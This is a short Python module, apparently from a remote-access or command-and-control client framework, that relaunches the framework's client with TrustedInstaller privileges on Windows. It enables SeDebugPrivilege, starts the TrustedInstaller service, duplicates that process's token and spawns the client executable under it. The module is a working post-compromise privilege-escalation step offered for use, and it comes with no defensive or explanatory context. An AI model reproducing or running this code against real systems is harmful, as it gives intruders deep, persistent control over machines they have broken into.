SCRIPT_METADATA = {
    "name": "win/privilege/run_as_ti",
    "display_name": "Run as TrustedInstaller",
    "description": "Launch a new client session with TrustedInstaller privileges - requires SYSTEM access first",
    "platforms": ["windows"],
    "category": "Privilege",
    "params": []
}

from client.runtime.win_util import enable_privilege, get_pid, duplicate_token, \
    create_process_with_token, get_process_token, start_service
from client.runtime.client_util import get_executable_path


def run_as_trusted_installer():
    enable_privilege('SeDebugPrivilege')
    start_service('TrustedInstaller')
    pid = get_pid('TrustedInstaller.exe')
    if not pid:
        print('TrustedInstaller.exe not found - ensure you are running as SYSTEM')
        return
    h_token = duplicate_token(get_process_token(pid))
    pid = create_process_with_token(h_token, r"C:\windows\system32\cmd.exe", "/c " + get_executable_path())
    print(f'Process created as TrustedInstaller: {pid}')


run_as_trusted_installer()